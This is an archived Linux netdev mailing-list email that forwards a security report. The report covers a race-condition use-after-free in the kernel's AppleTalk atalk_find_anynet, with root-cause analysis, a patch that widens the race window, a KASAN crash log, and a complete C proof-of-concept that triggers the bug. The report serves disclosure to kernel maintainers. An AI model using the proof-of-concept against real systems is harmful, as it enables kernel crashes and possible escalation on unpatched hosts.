Return-Path: <netdev+bounces-38743-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [147.75.199.223])
	by mail.lfdr.de (Postfix) with ESMTPS id EBF127BC508
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:37:19 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 1597D1C20959
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:37:19 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 047D8746B;
	Sat,  7 Oct 2023 06:37:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dkim=none
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BCAA29CA7F
	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:37:14 +0000 (UTC)
Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 98D39BD
	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:37:11 -0700 (PDT)
Received: (from willy@localhost)
	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976b1vI021171;
	Sat, 7 Oct 2023 08:37:01 +0200
Date: Sat, 7 Oct 2023 08:37:01 +0200
From: Willy Tarreau <w@1wt.eu>
To: netdev@vger.kernel.org
Cc: rootlab@huawei.com
Subject: Fwd: Race Condition Vulnerability in atalk_find_anynet of nfc module
 leading to UAF
Message-ID: <20231007063701.GT20998@1wt.eu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_PASS,SPF_PASS autolearn=ham
	autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

Hello,

Sili Luo of Huawei sent this to the security list. Eric and I think it
does not deserve special handling from the security team and will be
better addressed here.

Regards,
Willy

PS: there are 6 reports for atalk in this series.

----- Forwarded message from rootlab <rootlab@huawei.com> -----

> Date: Sat, 7 Oct 2023 03:10:13 +0000
> From: rootlab <rootlab@huawei.com>
> Subject: Race Condition Vulnerability in atalk_find_anynet of nfc module leading to UAF
> To: "security@kernel.org" <security@kernel.org>
> Delivered-To: security@kernel.org
> 
> I recently found an race condition Vulnerability in the atalk_find_anynet, which leads to the kernel access free'd iface object.
> 
> The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
> 
> [Root Cause]
> 
>   *   atalk_rcv
> 
>      *   atalk_find_anynet
> 
>         *   struct atalk_iface *iface = dev->atalk_ptr;
>         *   iface->status & ATIF_PROBE
> 
> atalk_find_anynet does not hold locks, other thread may free iface when atalk_find_anynet still need to use it.
> 
> iface can be free'd through ioctl(at_fd, SIOCDIFADDR, &atreq);.
> 
>   *   atalk_ioctl
> 
>      *   rtnl_lock();
> 
>      *   atalk_dev_down
> 
>         *   atif_drop_device
> 
>            *   kfree(tmp);
>      *   rtnl_unlock();
> 
> steps to trigger bug:
> 
>   1.  let thread A is executed in the middle of 1 and 2
>   2.  then thread B free iface via ioctl(at_fd, SIOCDIFADDR, &atreq)
>   3.  Then thread A will use the free'd iface.
> 
>                                Time
>                                 +
>                                 |
> thread A                        |  thread B
> atalk_find_anynet               |  ioctl --> atalk_dev_down
>                                 |
>                                 |
>   1.iface = dev->atalk_ptr;     |
>                                 |
>                                 |
>                                 |     2.atif_drop_device(dev)  --> free iface
>                                 |
>                                 |
>     // UAF!                     |
>   3.iface->status & ATIF_PROBE  |
>                                 +
> 
> 
> [Patch Suggestion]
> 
>   1.  add refcount for struct atalk_route
>   2.  Use the right lock
> 
> [Proof-of-Concept]
> 
> The POC is at the end of the email.
> 
> Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
> 
> To increase the probability of race, I add some loops to the race part of the code ( atalk_find_anynet ) to increase the time window.
> 
> the dxxx() function just do some loop to increase the time window.
> 
> From dda9221127933a7939fe52144aa1d91f90aed2b7 Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 17:32:52 +0800
> Subject: [PATCH] appletalk: patch for race in atalk_find_anynet
> 
> add some loops in the race code.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 17 +++++++++++++++++
>  1 file changed, 17 insertions(+)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..ca6dfa9e0c47 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -369,6 +369,19 @@ static struct atalk_addr *atalk_find_primary(void)
>         return retval;
>  }
> 
> +#pragma GCC push_options
> +#pragma GCC optimize ("O0")
> +noinline u64 dxxx(void)
> +{
> +       u64 xxx = 0;
> +       for (size_t i = 0; i < 100000000; i++) {
> +               xxx *= 0x241;
> +               xxx += 0x1234;
> +       }
> +       return xxx;
> +}
> +#pragma GCC pop_options
> +
>  /*
>   * Find a match for 'any network' - ie any of our interfaces with that
>   * node number will do just nicely.
> @@ -377,6 +390,10 @@ static struct atalk_iface *atalk_find_anynet(int node, struct net_device *dev)
>  {
>         struct atalk_iface *iface = dev->atalk_ptr;
> 
> +       printk("vuln: [atalk_find_anynet] %llx\n", (uint64_t)iface);
> +       dxxx();
> +       printk("vuln: [atalk_find_anynet] do use %llx\n", (uint64_t)iface);
> +
>         if (!iface || iface->status & ATIF_PROBE)
>                 goto out_err;
> 
> --
> 2.25.1
> 
> 
> 
> panic log
> 
> 
> # /tmp/atalk_rcv
> fd: 3
> [  965.845681] [atalk_rcv]
> [  965.846219] vuln: [atalk_find_anynet] ffff8880099f5040
> [  966.281728] vuln: [atalk_find_anynet] do use ffff8880099f5040
> [  966.282254] ==================================================================
> [  966.282775] BUG: KASAN: slab-use-after-free in atalk_find_anynet+0x5b/0xa0 [appletalk]
> [  966.283413] Read of size 4 at addr ffff8880099f504c by task atalk_rcv/229
> [  966.283918]
> [  966.284047] CPU: 1 PID: 229 Comm: atalk_rcv Tainted: G           OE      6.5.0-rc5 #7
> [  966.284624] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
> [  966.285297] Call Trace:
> [  966.285490]  <IRQ>
> [  966.285657]  dump_stack_lvl+0x4c/0x70
> [  966.285955]  print_report+0xd3/0x620
> [  966.286246]  ? kasan_complete_mode_report_info+0x7d/0x200
> [  966.286658]  ? atalk_find_anynet+0x5b/0xa0 [appletalk]
> [  966.287044]  kasan_report+0xc2/0x100
> [  966.287325]  ? atalk_find_anynet+0x5b/0xa0 [appletalk]
> [  966.287721]  __asan_load4+0x84/0xb0
> [  966.287981]  atalk_find_anynet+0x5b/0xa0 [appletalk]
> [  966.288362]  atalk_rcv+0x278/0x440 [appletalk]
> [  966.288711]  ? __pfx_atalk_rcv+0x10/0x10 [appletalk]
> [  966.289104]  ? __kasan_check_write+0x18/0x20
> [  966.289434]  ? llc_sap_find+0x15d/0x1d0 [llc]
> [  966.289772]  ? skb_pull_rcsum+0x88/0x140
> [  966.290088]  snap_rcv+0xd5/0x140 [psnap]
> [  966.290398]  ? __pfx_snap_rcv+0x10/0x10 [psnap]
> [  966.290754]  llc_rcv+0x21c/0x4b0 [llc]
> [  966.291041]  ? __pfx_llc_rcv+0x10/0x10 [llc]
> [  966.291362]  __netif_receive_skb_one_core+0x13d/0x150
> [  966.291742]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
> [  966.292147]  ? rcu_segcblist_accelerate+0x1fb/0x330
> [  966.292519]  ? __kasan_check_write+0x18/0x20
> [  966.292841]  ? _raw_spin_lock_irq+0x8c/0xe0
> [  966.293158]  __netif_receive_skb+0x23/0xb0
> [  966.293465]  process_backlog+0x107/0x260
> [  966.293760]  __napi_poll+0x69/0x310
> [  966.294021]  net_rx_action+0x2a1/0x580
> [  966.294304]  ? kvm_clock_get_cycles+0xd/0x20
> [  966.294625]  ? __pfx_net_rx_action+0x10/0x10
> [  966.294943]  ? clockevents_program_event+0x119/0x1a0
> [  966.295326]  ? tick_program_event+0x50/0xa0
> [  966.295637]  __do_softirq+0xf3/0x3f8
> [  966.295917]  do_softirq+0x53/0x80
> [  966.296179]  </IRQ>
> [  966.296341]  <TASK>
> [  966.296502]  __local_bh_enable_ip+0x6e/0x70
> [  966.296816]  __dev_queue_xmit+0x724/0x15b0
> [  966.297125]  ? __pfx___dev_queue_xmit+0x10/0x10
> [  966.297466]  ? alloc_skb_with_frags+0x81/0x340
> [  966.297799]  ? __kasan_check_write+0x18/0x20
> [  966.298110]  ? __kasan_check_write+0x18/0x20
> [  966.298423]  ? copyin+0x40/0x60
> [  966.298674]  ? __asan_storeN+0x16/0x20
> [  966.298953]  ? eth_header+0x87/0x100
> [  966.299231]  ? __pfx_eth_header+0x10/0x10
> [  966.299528]  llc_build_and_send_ui_pkt+0x126/0x160 [llc]
> [  966.299930]  ? __pfx_snap_request+0x10/0x10 [psnap]
> [  966.300298]  snap_request+0x5c/0x70 [psnap]
> [  966.300635]  atalk_sendmsg+0x983/0xc30 [appletalk]
> [  966.301008]  ? __kasan_record_aux_stack+0xac/0xc0
> [  966.301359]  ? __pfx_atalk_sendmsg+0x10/0x10 [appletalk]
> [  966.301763]  ? __rcu_read_unlock+0x5b/0x280
> [  966.302086]  ? apparmor_socket_sendmsg+0x2f/0x40
> [  966.302443]  ? __pfx_atalk_sendmsg+0x10/0x10 [appletalk]
> [  966.302851]  sock_sendmsg+0xef/0x100
> [  966.303131]  ? move_addr_to_kernel.part.0+0x4f/0x90
> [  966.303504]  __sys_sendto+0x1bd/0x270
> [  966.303774]  ? __pfx___sys_sendto+0x10/0x10
> [  966.304096]  ? dentry_free+0x81/0xc0
> [  966.304376]  ? __kasan_slab_free+0x139/0x1c0
> [  966.304714]  ? __virt_addr_valid+0xf2/0x180
> [  966.305057]  ? __call_rcu_common.constprop.0+0x1e9/0x3a0
> [  966.305451]  ? call_rcu+0x12/0x20
> [  966.305691]  ? __fput+0x2fc/0x4b0
> [  966.305938]  ? blkcg_maybe_throttle_current+0x92/0x520
> [  966.306324]  __x64_sys_sendto+0x84/0xa0
> [  966.306606]  do_syscall_64+0x60/0x90
> [  966.306882]  ? __kasan_check_read+0x15/0x20
> [  966.307188]  ? fpregs_assert_state_consistent+0x62/0x70
> [  966.307582]  ? exit_to_user_mode_prepare+0x3d/0x190
> [  966.307961]  ? syscall_exit_to_user_mode+0x2a/0x50
> [  966.308317]  ? do_syscall_64+0x6d/0x90
> [  966.308596]  ? syscall_exit_to_user_mode+0x2a/0x50
> [  966.308949]  ? do_syscall_64+0x6d/0x90
> [  966.309234]  ? irqentry_exit+0x3f/0x50
> [  966.309510]  ? exc_page_fault+0x79/0xf0
> [  966.309796]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [  966.310171] RIP: 0033:0x406cd4
> [  966.310408] Code: f2 fc ff ff 44 8b 4c 24 2c 4c 8b 44 24 20 89 c5 44 8b 54 24 28 48 8b 54 24 18 b8 2c 00 00 00 48 8b 74 24 10 8b 7c 24 08 0f 05 <48> 3d 00 f0 ff ff 77 30 89 ef 48 89 44 24 08 e8 18 fd ff ff 48 8b
> [  966.311763] RSP: 002b:00007f1b973a96e0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
> [  966.312332] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000406cd4
> [  966.312852] RDX: 0000000000000012 RSI: 00007f1b973a97a0 RDI: 0000000000000004
> [  966.313377] RBP: 0000000000000000 R08: 00007f1b973a9770 R09: 0000000000000014
> [  966.313890] R10: 0000000000000000 R11: 0000000000000293 R12: 00007ffd76473eae
> [  966.314406] R13: 00007ffd76473eaf R14: 00007ffd76473eb0 R15: 00007f1b973a9e80
> [  966.314924]  </TASK>
> [  966.315090]
> [  966.315207] Allocated by task 227:
> [  966.315471]  kasan_save_stack+0x2a/0x50
> [  966.315775]  kasan_set_track+0x29/0x40
> [  966.316057]  kasan_save_alloc_info+0x1f/0x30
> [  966.316375]  __kasan_kmalloc+0xb5/0xc0
> [  966.316659]  kmalloc_trace+0x4e/0xb0
> [  966.316928]  atif_add_device+0x3a/0x100 [appletalk]
> [  966.317297]  atif_ioctl+0x5f4/0x6c0 [appletalk]
> [  966.317641]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [  966.317990]  sock_do_ioctl+0xb9/0x1a0
> [  966.318269]  sock_ioctl+0x1b1/0x420
> [  966.318532]  __x64_sys_ioctl+0xd1/0x110
> [  966.318819]  do_syscall_64+0x60/0x90
> [  966.319089]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [  966.319474]
> [  966.319594] Freed by task 228:
> [  966.319829]  kasan_save_stack+0x2a/0x50
> [  966.320122]  kasan_set_track+0x29/0x40
> [  966.320402]  kasan_save_free_info+0x2f/0x50
> [  966.320722]  __kasan_slab_free+0x12e/0x1c0
> [  966.321042]  __kmem_cache_free+0x1b9/0x380
> [  966.321342]  kfree+0x7a/0x120
> [  966.321571]  atif_drop_device+0xb1/0x100 [appletalk]
> [  966.321947]  atif_ioctl+0x1eb/0x6c0 [appletalk]
> [  966.322292]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [  966.322643]  sock_do_ioctl+0xb9/0x1a0
> [  966.322921]  sock_ioctl+0x1b1/0x420
> [  966.323197]  __x64_sys_ioctl+0xd1/0x110
> [  966.323490]  do_syscall_64+0x60/0x90
> [  966.323766]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [  966.324132]
> [  966.324252] The buggy address belongs to the object at ffff8880099f5040
> [  966.324252]  which belongs to the cache kmalloc-32 of size 32
> [  966.325122] The buggy address is located 12 bytes inside of
> [  966.325122]  freed 32-byte region [ffff8880099f5040, ffff8880099f5060)
> [  966.325985]
> [  966.326107] The buggy address belongs to the physical page:
> [  966.326511] page:00000000088a28a3 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x99f5
> [  966.327187] anon flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
> [  966.327738] page_type: 0xffffffff()
> [  966.328002] raw: 000fffffc0000200 ffff888006842500 0000000000000000 0000000000000001
> [  966.328565] raw: 0000000000000000 0000000000400040 00000001ffffffff 0000000000000000
> [  966.329122] page dumped because: kasan: bad access detected
> [  966.329527]
> [  966.329664] Memory state around the buggy address:
> [  966.330019]  ffff8880099f4f00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> [  966.330531]  ffff8880099f4f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
> [  966.331048] >ffff8880099f5000: 00 00 03 fc fc fc fc fc fa fb fb fb fc fc fc fc
> [  966.331551]                                               ^
> [  966.331962]  ffff8880099f5080: fa fb fb fb fc fc fc fc 00 00 00 00 fc fc fc fc
> [  966.332487]  ffff8880099f5100: 00 00 02 fc fc fc fc fc fa fb fb fb fc fc fc fc
> [  966.333014] ==================================================================
> [  966.333557] Disabling lock debugging due to kernel taint
> Packet sent successfully.
> 
> 
> 
> [CREDIT]
> 
> Sili Luo
> RO0T Lab of Huawei
> 
> poc
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <linux/if_tun.h>
> #include <linux/atalk.h>
> #include <net/if.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
> 
> #include <net/route.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <arpa/inet.h>
> #include <linux/if_packet.h>
> #include <net/ethernet.h>
> #include <netinet/if_ether.h>
> #include <netinet/in.h>
> #include <netinet/ip.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> 
> 
> void pincpu(int cpu) {
>   cpu_set_t set;
>   CPU_ZERO(&set);
>   CPU_SET(cpu, &set);
>   if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
>     perror("setaffinity");
>   }
> }
> 
> int at_fd;
> 
> #define THREAD_NUMS 2
> pthread_barrier_t barrier;
> 
> void free_thread() {
>   pincpu(0);
> 
>   srand(time(NULL));
> 
> 
>   usleep(15000);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> }
> 
> void use_thread() {
>   pincpu(1);
> 
>   send_pkt2();
>   puts("use done");
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt2() {
> 
> 
> 
>   int sockfd;
>   struct sockaddr_ll sa;
>   struct ether_header eth_header;
>   struct iphdr ip_header;
>   char packet[ETH_FRAME_LEN];
>   char *interface = "eth0"; // Replace with your desired interface name
> 
>   // Create socket
>   sockfd = socket(PF_APPLETALK, SOCK_RAW, htons(ETH_P_ATALK));
>   if (sockfd == -1) {
>     perror("socket");
>     return 1;
>   }
> 
>   // Set interface index
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = PF_APPLETALK;
>   sa.sll_protocol = htons(ETH_P_ATALK);
>   sa.sll_ifindex = if_nametoindex(interface);
> 
>   struct sockaddr_at ssa = {0};
> 
>   ssa.sat_addr.s_node = 0;
>   ssa.sat_addr.s_net = 0;
>   ssa.sat_family = PF_APPLETALK;
> 
>   // Set Ethernet header
>   memset(&eth_header, 0, sizeof(struct ether_header));
>   eth_header.ether_shost[0] = 0x00; // Source MAC address
>   eth_header.ether_shost[1] = 0x11;
>   eth_header.ether_shost[2] = 0x22;
>   eth_header.ether_shost[3] = 0x33;
>   eth_header.ether_shost[4] = 0x44;
>   eth_header.ether_shost[5] = 0x55;
>   eth_header.ether_dhost[0] = 0x66; // Destination MAC address
>   eth_header.ether_dhost[1] = 0x77;
>   eth_header.ether_dhost[2] = 0x88;
>   eth_header.ether_dhost[3] = 0x99;
>   eth_header.ether_dhost[4] = 0xAA;
>   eth_header.ether_dhost[5] = 0xBB;
>   eth_header.ether_type = htons(ETH_P_ATALK);
> 
>   // Set IP header
>   memset(&ip_header, 0x22, sizeof(struct iphdr));
> 
>   memcpy(packet, &eth_header, sizeof(struct ether_header));
> 
>   uint8_t *ptr = packet + sizeof(struct ether_header);
> 
>   *(uint64_t *)ptr = 0x11223344;
> 
>   // Send the packet
>   if (sendto(sockfd, packet, sizeof(struct ether_header) + 4, 0,
>              (struct sockaddr *)&ssa, sizeof(struct sockaddr_ll)) == -1) {
>     perror("sendto");
>     return 1;
>   }
> 
>   printf("Packet sent successfully.\n");
> 
>   // Close the socket
>   close(sockfd);
> 
>   return 0;
> }
> 
> int main() {
> 
>   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
>   printf("fd: %d\n", at_fd);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCSIFADDR, &atreq);
> 
> 
>   struct rtentry rt = {0};
>   char name[] = "lo";
>   rt.rt_dev = NULL;
> 
>         struct sockaddr_at *ta = (struct sockaddr_at *)&rt.rt_dst;
>         struct sockaddr_at *ga = (struct sockaddr_at *)&rt.rt_gateway;
>   ta->sat_family = AF_APPLETALK;
>   ga->sat_family = AF_APPLETALK;
>   ta->sat_addr.s_net = 0x43;
>   ta->sat_addr.s_node = 0x42;
>   ga->sat_addr = sa->sat_addr;
>   ioctl(at_fd, SIOCADDRT, &rt);
> 
> 
> 
>   // getchar();
> 
>   // return;
> 
>   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
> 
>   pthread_t ids[2] = {0};
>   pthread_create(&ids[0], NULL, (void *)free_thread, NULL);
>   pthread_create(&ids[1], NULL, (void *)use_thread, NULL);
> 
>   pthread_join(ids[0], NULL);
>   pthread_join(ids[1], NULL);
> 
>   sleep(1);
> }
> 
> 

----- End forwarded message -----

